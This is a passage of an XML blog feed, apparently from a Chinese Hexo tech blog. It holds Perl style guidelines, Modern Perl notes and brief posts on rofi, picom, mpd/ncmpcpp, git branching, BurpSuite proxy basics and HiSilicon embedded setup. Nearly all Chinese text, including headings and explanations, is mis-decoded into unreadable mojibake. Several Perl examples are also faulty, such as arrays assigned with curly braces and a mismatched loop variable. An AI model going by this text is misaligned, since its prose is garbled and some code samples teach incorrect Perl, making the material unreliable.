    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -æœ€ä½³å®è·µ"><a href="#ç¬¬ä¸€ç« -æœ€ä½³å®è·µ" class="headerlink" title="ç¬¬ä¸€ç«  æœ€ä½³å®è·µ"></a>ç¬¬ä¸€ç«  æœ€ä½³å®è·µ</h1><h2 id="ä¸‰ä¸ªç›®æ ‡"><a href="#ä¸‰ä¸ªç›®æ ‡" class="headerlink" title="ä¸‰ä¸ªç›®æ ‡"></a>ä¸‰ä¸ªç›®æ ‡</h2><h3 id="å¼ºå¥"><a href="#å¼ºå¥" class="headerlink" title="å¼ºå¥"></a>å¼ºå¥</h3><p>å­˜å‚¨å¼•ç”¨çš„å˜é‡çš„åç§°éƒ½åŠ ä¸Š <code>_ref</code></p><h3 id="æ•ˆç‡"><a href="#æ•ˆç‡" class="headerlink" title="æ•ˆç‡"></a>æ•ˆç‡</h3><h3 id="å¯ç»´æŠ¤æ€§"><a href="#å¯ç»´æŠ¤æ€§" class="headerlink" title="å¯ç»´æŠ¤æ€§"></a>å¯ç»´æŠ¤æ€§</h3><p>å°†ç†è§£å†™å…¥è¯´æ˜æ–‡æ¡£æˆ–æºä»£ç .</p><h2 id="æ”¹å˜ä¹ æƒ¯"><a href="#æ”¹å˜ä¹ æƒ¯" class="headerlink" title="æ”¹å˜ä¹ æƒ¯"></a>æ”¹å˜ä¹ æƒ¯</h2><h1 id="ç¬¬äºŒç« -ä»£ç éƒ¨ç½²"><a href="#ç¬¬äºŒç« -ä»£ç éƒ¨ç½²" class="headerlink" title="ç¬¬äºŒç«  ä»£ç éƒ¨ç½²"></a>ç¬¬äºŒç«  ä»£ç éƒ¨ç½²</h1><h2 id="æ‹¬å·æ–¹å¼"><a href="#æ‹¬å·æ–¹å¼" class="headerlink" title="æ‹¬å·æ–¹å¼"></a>æ‹¬å·æ–¹å¼</h2><p>ç”¨ <code>K&amp;R</code> é£æ ¼, å³ <code>&#123;</code> æ”¾åœ¨ä¸€è¡Œçš„æœ«å°¾:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @names = &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h2><p>å…³é”®å­—å’Œåç»­çš„æ‹¬å·é—´åŠ ä¸€ä¸ªç©ºæ ¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> ($min &lt; $max) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å­ç¨‹åºå’Œå˜é‡"><a href="#å­ç¨‹åºå’Œå˜é‡" class="headerlink" title="å­ç¨‹åºå’Œå˜é‡"></a>å­ç¨‹åºå’Œå˜é‡</h2><p>å­ç¨‹åºå’Œå˜é‡åœ¨å…¶åç§°å’Œåç»­æ‹¬å·é—´ä¸èƒ½æœ‰æ‹¬å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @candidates = get_candidates($marker);<br><span class="hljs-keyword">print</span> $array[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><h2 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h2><p>Perl æœ‰å¾ˆå¤šå†…ç½®å‡½æ•°å®è´¨ä¸Šå°±æ˜¯è¯¥è¯­è¨€çš„å…³é”®å­—, æ‰€ä»¥ä¸éœ€å°æ‹¬å·ä¾¿å¯ä»¥åˆæ³•è°ƒç”¨å®ƒä»¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chomp</span> $record;<br></code></pre></td></tr></table></figure><h2 id="é”®å’Œç´¢å¼•"><a href="#é”®å’Œç´¢å¼•" class="headerlink" title="é”®å’Œç´¢å¼•"></a>é”®å’Œç´¢å¼•</h2><p>æŠŠå¤æ‚çš„é”®æˆ–ç´¢å¼•ä¸å‘¨å›´çš„æ‹¬å·åˆ†å¼€.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$candidates[$i] = $incumbent&#123; $candidates[$i] &#123; get_region() &#125; &#125;;<br><span class="hljs-comment"># ä»¥åŠ</span><br><span class="hljs-keyword">print</span> $incumbent&#123; $largest_gerrymandered_constituency &#125;;<br></code></pre></td></tr></table></figure><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p>åˆ©ç”¨ç©ºç™½è®©äºŒå…ƒè¿ç®—ç¬¦ç›¸å¯¹äºå…¶æ“ä½œæ•°æ›´é†’ç›®:</p><p>å¦‚æŠŠ <code>+</code> å’Œ <code>*</code> è¿™äº›:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $displacement<br>    = $initial_velocity * $time + <span class="hljs-number">0</span>.<span class="hljs-number">5</span> *acceleration * <span class="hljs-keyword">time</span>**<span class="hljs-number">2</span>;<br><br><span class="hljs-keyword">my</span> $price <br>    = $coupon_paid * $exp_rate + ($face_val + $coupon_paid) * $exp_rate**<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ ¹æ®ä¼˜å…ˆçº§æ¥é€‰æ‹©ç©ºç™½çš„æ•°é‡. å¦‚è¿™é‡Œçš„ <code>$exp_rate**2</code> å°±å†™å¾—ç´§å‡‘, æ˜¾ç¤ºé«˜ä¼˜å…ˆçº§.</p><p>ä¸€å…ƒè¿ç®—ç¬¦åº”è¯¥å’Œå…¶æ“ä½œæ•°ç´§è´´åœ¨ä¸€èµ·, å¦‚ <code>-</code>, <code>!</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $spring_force = !$hyperextended ? -$spring_contant * $extension : <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h2 id="åˆ†å·"><a href="#åˆ†å·" class="headerlink" title="åˆ†å·"></a>åˆ†å·</h2><p>æœ¬æ¥, ä¸€ä¸ªä»£ç å—çš„æœ€åä¸€æ¡è¯­å¥åé¢å¹¶ä¸éœ€è¦åˆ†å·, ä½†æœ€å¥½éƒ½æ”¾ä¸Šåˆ†å·.</p><h2 id="é€—å·"><a href="#é€—å·" class="headerlink" title="é€—å·"></a>é€—å·</h2><p>å¤šè¡Œåˆ—è¡¨ä¸­çš„æ¯ä¸ªå€¼åé¢éƒ½æ”¾é€—å·.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @dwarves = &#123;<br>    <span class="hljs-string">&#x27;Bashful&#x27;</span>,<br>    <span class="hljs-string">&#x27;Doc&#x27;</span>,<br>    <span class="hljs-string">&#x27;Dopey&#x27;</span>,<br>    <span class="hljs-string">&#x27;Grumpy&#x27;</span>,<br>    <span class="hljs-string">&#x27;Happy&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sleepy&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sneezy&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰å°¾ç«¯é€—å·.</p><h2 id="ä»£ç è¡Œçš„é•¿åº¦"><a href="#ä»£ç è¡Œçš„é•¿åº¦" class="headerlink" title="ä»£ç è¡Œçš„é•¿åº¦"></a>ä»£ç è¡Œçš„é•¿åº¦</h2><p>ä½¿ç”¨ 78 åˆ—çš„ä»£ç è¡Œ.</p><p>å¥½å¤„ä¸º, ç¡®ä¿é€šè¿‡ç”µå­é‚®ä»¶ä¼ é€çš„ä»£ç ç‰‡æ®µåœ¨è‡³å°‘è¢«å¼•ç”¨ä¸€æ¬¡æ—¶è¿˜ä¸ä¼šäº§ç”Ÿé‡å .</p><h2 id="ç¼©æ’"><a href="#ç¼©æ’" class="headerlink" title="ç¼©æ’"></a>ç¼©æ’</h2><p>ä½¿ç”¨ 4 åˆ—ç¼©æ’å±‚æ¬¡.</p><p>è¾ƒå°çš„ç¼©æ’ä¼šæŠŠå›ºå®šå®½åº¦æ˜¾ç¤ºå™¨ä¸Šèƒ½æ˜¾ç¤ºçš„åµŒå¥—ç¼©æ’å±‚æ¬¡æ•°ç›®æœ€å¤§åŒ–.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $lines = &lt;&gt;) &#123;<br>    <span class="hljs-keyword">chomp</span> $line;<br>    <span class="hljs-keyword">if</span> ( $line =~ <span class="hljs-regexp">s&#123;\A (\s*) -- (.*h)&#125;&#123;$1#$2&#125;xms</span>) &#123;<br>        <span class="hljs-keyword">push</span> @comments, $2;<br>    &#125;<br>    <span class="hljs-keyword">print</span> $line;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åˆ¶è¡¨ç¬¦"><a href="#åˆ¶è¡¨ç¬¦" class="headerlink" title="åˆ¶è¡¨ç¬¦"></a>åˆ¶è¡¨ç¬¦</h2><p>ä»¥ç©ºæ ¼ç¼©æ’, ä¸è¦ä»¥åˆ¶è¡¨ç¬¦ (tab) ç¼©æ’.</p><p>åœ¨ä¸åŒè¾“å‡ºè®¾å¤‡ä¸Šæ‰“å°æˆ–è€…è´´åˆ°æ–‡å­—å¤„ç†å™¨çš„æ–‡æ¡£æ—¶, ç”šè‡³åªæ˜¯åœ¨åˆ«äººè®¾æœ‰ä¸åŒåˆ¶è¡¨ç¬¦ç©ºé—´çš„ç¼–è¾‘å™¨ä¸Šè§‚çœ‹æ—¶, åˆ¶è¡¨ç¬¦çœ‹èµ·æ¥éƒ½ä¸ä¼šç›¸åŒ.</p><p>å°†æŒ‰ä¸‹ <code>Tab</code> é”®çš„ç»“æœè½¬æ¢ä¸ºç©ºæ ¼, è€Œä¸æ˜¯åˆ¶è¡¨ç¬¦, å¯¹äº <code>vim</code> :</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> tabstop=<span class="hljs-number">4</span><br><span class="hljs-keyword">set</span> expandtab<br><span class="hljs-keyword">set</span> <span class="hljs-built_in">shiftwidth</span>=<span class="hljs-number">4</span><br><span class="hljs-keyword">set</span> shiftround<br></code></pre></td></tr></table></figure><h2 id="å—"><a href="#å—" class="headerlink" title="å—"></a>å—</h2><p>ç»ä¸æŠŠä¸¤æ¡è¯­å¥æ”¾åœ¨åŒä¸€è¡Œ.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $record = &lt;$inventory_file&gt;) &#123;<br>    <span class="hljs-keyword">chomp</span> $record; <span class="hljs-keyword">next</span> RECORD <span class="hljs-keyword">if</span> $record eq $EMPTY_STR<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $record = &lt;$inventory_file&gt;) &#123;<br>    <span class="hljs-keyword">chomp</span> $record;<br>    <span class="hljs-keyword">next</span> RECORD <span class="hljs-keyword">if</span> $record eq $EMPTY_STR<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ <code>map</code> ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @clean_words<br>    = <span class="hljs-keyword">map</span> &#123;<br>        <span class="hljs-keyword">my</span> $word = $_;<br>        $word =~ <span class="hljs-regexp">s/$EXPLETIVE/[DELETED]/gxms</span>;<br>        $word;<br>    &#125; @raw_words;<br></code></pre></td></tr></table></figure><h2 id="ç»„å—"><a href="#ç»„å—" class="headerlink" title="ç»„å—"></a>ç»„å—</h2><p>ä»£ç è¦åˆ†æ®µè½.</p><p>å°†æ¯å—ç¨‹åºåˆ†æˆä¸€äº›èƒ½å®Œæˆå•ä¸€ä»»åŠ¡çš„åºåˆ—, å†åœ¨æ¯ä¸ªåºåˆ—é—´æ”¾ç½®ä¸€è¡Œç©ºç™½. å¯ä»¥åœ¨æ¯ä¸ªæ®µè½å¼€å§‹å¤„æ”¾ç½®ä¸€è¡Œæ³¨é‡Š.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-comment"># some comments</span><br>    code<br><br>    <span class="hljs-comment"># some comments</span><br>    code<br><br>    <span class="hljs-comment"># some comments</span><br>    code<br><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h2><p>ä¸è¦ç´§è´´ç€ <code>else</code>. </p><p>å†™æˆ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#125;<br><span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><h2 id="å‚ç›´å¯¹é½"><a href="#å‚ç›´å¯¹é½" class="headerlink" title="å‚ç›´å¯¹é½"></a>å‚ç›´å¯¹é½</h2><p>å‚ç›´å¯¹é½ç›¸å¯¹åº”çš„é¡¹ç›®.</p><p>å¦‚æ•°ç»„, æ•£åˆ—èµ‹å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @months = <span class="hljs-string">qw (</span><br><span class="hljs-string">    January     February    March</span><br><span class="hljs-string">    April       May         June</span><br><span class="hljs-string">)</span>;<br></code></pre></td></tr></table></figure><p>å¯¹é½èµ‹å€¼è¿ç®—ç¬¦.</p><h2 id="æ–­å¼€é•¿è¡Œ"><a href="#æ–­å¼€é•¿è¡Œ" class="headerlink" title="æ–­å¼€é•¿è¡Œ"></a>æ–­å¼€é•¿è¡Œ</h2><p>åœ¨è¿ç®—ç¬¦ä¹‹å‰æ–­å¼€é•¿è¡¨è¾¾å¼, ä¸”éµå¾ªé å·¦è§„å¾‹, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">push</span> @steps, $steps[-<span class="hljs-number">1</span>] <br>             + $radial_velocity * $elapsed_time <br>             + $orbital_velocity * ($phase + $phase_shift) <br>             - $DRAG_COEFF * $altitude<br>             ;<br></code></pre></td></tr></table></figure><h2 id="éæœ«ç«¯è¡¨è¾¾å¼"><a href="#éæœ«ç«¯è¡¨è¾¾å¼" class="headerlink" title="éæœ«ç«¯è¡¨è¾¾å¼"></a>éæœ«ç«¯è¡¨è¾¾å¼</h2><p>æŠŠè¯­å¥ä¸­çš„å†—é•¿è¡¨è¾¾å¼åˆ†ç¦»å‡ºæ¥, å³å¯ä»¥ç”¨ä¸€ä¸ªå˜é‡ä¹‹ç±»çš„æ¥æ›¿æ¢å†—é•¿è¡¨è¾¾å¼, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $next_step = $steps[-<span class="hljs-number">1</span>]<br>                + $radial_velocity * $elapsed_time<br>                 + $orbital_velocity * ($phase + $phase_shift) <br>                 - $DRAG_COEFF * $altitude<br>                 ;<br>add_step( \@steps, $next_step, $elapsed_time);<br></code></pre></td></tr></table></figure><h2 id="æŒ‰ä¼˜å…ˆçº§æ–­å¼€"><a href="#æŒ‰ä¼˜å…ˆçº§æ–­å¼€" class="headerlink" title="æŒ‰ä¼˜å…ˆçº§æ–­å¼€"></a>æŒ‰ä¼˜å…ˆçº§æ–­å¼€</h2>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>rofi-ä½¿ç”¨å’Œé…ç½®</title>
    <link href="/2023/01/21/rofi-%E4%BD%BF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/01/21/rofi-%E4%BD%BF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/davatorium/rofi">å®˜æ–¹ Github ä»“åº“</a></p><p>ç”Ÿæˆé»˜è®¤é…ç½®æ–‡ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> -p ~/.config/rofi<br>$ rofi -dump-config &gt; ~/.config/rofi/config.rasi<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨è‡ªå®šä¹‰çš„æ¨¡å¼-mod"><a href="#ä½¿ç”¨è‡ªå®šä¹‰çš„æ¨¡å¼-mod" class="headerlink" title="ä½¿ç”¨è‡ªå®šä¹‰çš„æ¨¡å¼ mod"></a>ä½¿ç”¨è‡ªå®šä¹‰çš„æ¨¡å¼ mod</h1><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ rofi -modes <span class="hljs-string">&quot;Test:/tmp/test.sh&quot;</span> -show Test<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰çš„åç§°å¦‚ <code>Test:test.sh</code> å†’å·å‰ä¸º mod å, ä¹‹åä¸ºè„šæœ¬å, è„šæœ¬çš„è¾“å‡ºä¼šå‡ºç°åœ¨ rofi çš„ç­›é€‰ä¸­.</p><p>è„šæœ¬ä¸ä¸€å®šæ˜¯ shell è„šæœ¬.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>picom-ç›¸å…³</title>
    <link href="/2023/01/21/picom-%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/01/21/picom-%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="picom"><a href="#picom" class="headerlink" title="picom"></a>picom</h1><p>picom æ˜¯ä¸€ä¸ªçª—å£æ•ˆæœåˆæˆå™¨.</p><p>å…¶æä¾›äº†çª—å£çš„é€æ˜, èƒŒæ™¯æ¨¡ç³Š, æ·¡å…¥æ·¡å‡º, åœ†è§’, åŠ¨ç”»ç­‰æ•ˆæœ.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>mpd-ä»¥åŠ-ncmpcpp-çš„ä½¿ç”¨</title>
    <link href="/2023/01/21/mpd-%E4%BB%A5%E5%8F%8A-ncmpcpp-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/01/21/mpd-%E4%BB%A5%E5%8F%8A-ncmpcpp-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><code>mpd</code> æ˜¯åç«¯ Web æœåŠ¡ç¨‹åº, å³è¿è¡Œåœ¨åå°çš„æœåŠ¡ã€‚<code>ncmpcpp</code> æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯.</p><p><code>ncmpcpp</code> æ˜¯ç”±å¾ˆå¤šåˆ—è¡¨æ„æˆ. 1 ä¸ºå½“å‰æ’­æ”¾åˆ—è¡¨, 2 ä¸ºå…¨éƒ¨æ­Œæ›², 3 ä¸ºéŸ³ä¹åº“, 8 æ˜¯é¢‘è°±æ’­æ”¾é¡µé¢, &#x3D; ä¸ºæ—¶é’Ÿ. <code>F1</code> ä¸ºå¿«æ·é”®åˆ—è¡¨. å›è½¦æ’­æ”¾éŸ³ä¹.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2023/01/19/Git-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/01/19/Git-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»¥æŸä¸€ä¸ª-commit-æ–°å»ºä¸€ä¸ª-branch"><a href="#ä»¥æŸä¸€ä¸ª-commit-æ–°å»ºä¸€ä¸ª-branch" class="headerlink" title="ä»¥æŸä¸€ä¸ª commit æ–°å»ºä¸€ä¸ª branch"></a>ä»¥æŸä¸€ä¸ª commit æ–°å»ºä¸€ä¸ª branch</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git branch NEW_BRANCH_NAME COMMIT_ID<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite-ä½¿ç”¨-Notes</title>
    <link href="/2023/01/19/BurpSuite-%E4%BD%BF%E7%94%A8-Notes/"/>
    <url>/2023/01/19/BurpSuite-%E4%BD%BF%E7%94%A8-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸‰ç« -å¦‚ä½•ä½¿ç”¨-Burp-Suite-ä»£ç†"><a href="#ç¬¬ä¸‰ç« -å¦‚ä½•ä½¿ç”¨-Burp-Suite-ä»£ç†" class="headerlink" title="ç¬¬ä¸‰ç«  å¦‚ä½•ä½¿ç”¨ Burp Suite ä»£ç†"></a>ç¬¬ä¸‰ç«  å¦‚ä½•ä½¿ç”¨ Burp Suite ä»£ç†</h1><p>proxy åŠŸèƒ½çš„é»˜è®¤ç«¯å£æ˜¯ <code>8080</code>.</p><p>å¯ä»¥åœ¨å³é”®çš„åŠŸèƒ½æ ä¸­è®¾ç½®ä¸æ‹¦æˆªæŸä¸ª IP.</p><p>å¯ä»¥æ³¨é‡Š, é«˜å…‰æ‹¦æˆªçš„æ¶ˆæ¯.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ·æ€åµŒå…¥å¼-Notes</title>
    <link href="/2023/01/19/%E6%B5%B7%E6%80%9D%E5%B5%8C%E5%85%A5%E5%BC%8F-Notes/"/>
    <url>/2023/01/19/%E6%B5%B7%E6%80%9D%E5%B5%8C%E5%85%A5%E5%BC%8F-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu-ç¯å¢ƒæ­å»º"><a href="#Ubuntu-ç¯å¢ƒæ­å»º" class="headerlink" title="Ubuntu ç¯å¢ƒæ­å»º"></a>Ubuntu ç¯å¢ƒæ­å»º</h1><p>DevEcotools å¯ä»¥åœ¨ ubuntu çš„ docker é•œåƒä¸‹å®‰è£….</p><p>IDE å¯ä»¥ç”¨ wine åœ¨ Arch ä¸Šè¿è¡Œ.</p><p>å½“å‰è®¾ç½®çš„ alias ä¸º <code>haisi</code> å¯å¯åŠ¨ IDE.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Modern-Perl-Notes</title>
    <link href="/2023/01/18/Modern-Perl-Notes/"/>
    <url>/2023/01/18/Modern-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="è¿è¡Œ-Modern-Perl"><a href="#è¿è¡Œ-Modern-Perl" class="headerlink" title="è¿è¡Œ Modern Perl"></a>è¿è¡Œ Modern Perl</h1><p>ç”¨äºæµ‹è¯•çš„æ¨¡å— <code>Test::More</code>.</p><p>ç®¡ç† Perl ç‰ˆæœ¬ç”¨ <code>App::perlbrew</code>.</p><h1 id="Perl-5-å’Œ-Perl-6"><a href="#Perl-5-å’Œ-Perl-6" class="headerlink" title="Perl 5 å’Œ Perl 6"></a>Perl 5 å’Œ Perl 6</h1><p>è‹¥è¦å­¦ä¹  Perl 6, å¯æµè§ˆ <a href="http://perl6.org/">http://perl6.org</a>, è¯•ç”¨ Rakudo ( <a href="http://www.rakudo.org/">http://www.rakudo.org</a> ), ä»¥åŠ <code>Using Perl 6</code> ä¸€ä¹¦.</p><h1 id="Perl-å“²å­¦"><a href="#Perl-å“²å­¦" class="headerlink" title="Perl å“²å­¦"></a>Perl å“²å­¦</h1><h1 id="Perldoc"><a href="#Perldoc" class="headerlink" title="Perldoc"></a>Perldoc</h1><p><code>perldoc perlfaq</code> ä¼šæ˜¾ç¤º Perl 5 å¸¸è§é—®é¢˜çš„ç›®å½•.</p><p><code>perldoc perldiag</code> è§£é‡Šäº† Perl ä¸­è­¦å‘Šæ¶ˆæ¯çš„å«ä¹‰.</p><p><code>perldoc perlpod</code> æè¿°äº† POD çš„å·¥ä½œæ–¹å¼.</p><h1 id="è¡¨è¾¾åŠ›"><a href="#è¡¨è¾¾åŠ›" class="headerlink" title="è¡¨è¾¾åŠ›"></a>è¡¨è¾¾åŠ›</h1><p>Perl é»‘å®¢çš„å£å· â€œTIMTOWTDIâ€, å‘éŸ³ä¸º â€œTim Todayâ€, æˆ– â€œThere is more than one way to do it!â€</p><p>å¦ä¸€ä¸ª Perl çš„è®¾è®¡ç›®æ ‡æ˜¯, å°½å¯èƒ½ä¸ä½¿æœ‰ç»éªŒçš„ (Perl) ç¨‹åºå‘˜åƒæƒŠ.</p><h1 id="ä¸Šä¸‹æ–‡"><a href="#ä¸Šä¸‹æ–‡" class="headerlink" title="ä¸Šä¸‹æ–‡"></a>ä¸Šä¸‹æ–‡</h1><h2 id="ç©º-æ ‡é‡å’Œåˆ—è¡¨ä¸Šä¸‹æ–‡"><a href="#ç©º-æ ‡é‡å’Œåˆ—è¡¨ä¸Šä¸‹æ–‡" class="headerlink" title="ç©º, æ ‡é‡å’Œåˆ—è¡¨ä¸Šä¸‹æ–‡"></a>ç©º, æ ‡é‡å’Œåˆ—è¡¨ä¸Šä¸‹æ–‡</h2><p>ç›´æ¥è°ƒç”¨ä¸€ä¸ªå‡½æ•°è€Œä¸å¯¹å…¶è¿”å›å€¼åŠ ä»¥åˆ©ç”¨, å¯ä»¥è®¤ä¸ºæ˜¯<mark>ç©ºä¸Šä¸‹æ–‡</mark>. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">some_expensive_operation();<br></code></pre></td></tr></table></figure><p>å°†å‡½æ•°çš„è¿”å›å€¼èµ‹å€¼ç»™å•ä¸ªå…ƒç´ ä½¿å¾—å‡½æ•°åœ¨<mark>æ ‡é‡ä¸Šä¸‹æ–‡</mark>ä¸­æ±‚å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $single_result = some_expensive_operation();<br></code></pre></td></tr></table></figure><p>å°†è°ƒç”¨å‡½æ•°çš„ç»“æœèµ‹å€¼ç»™ä¸€ä¸ªæ•°ç»„æˆ–æ˜¯åˆ—è¡¨, æˆ–è€…åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ä½¿ç”¨è¯¥ç»“æœ, ä½¿å¾—å‡½æ•°åœ¨ <mark>åˆ—è¡¨ä¸Šä¸‹æ–‡</mark> ä¸­æ±‚å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 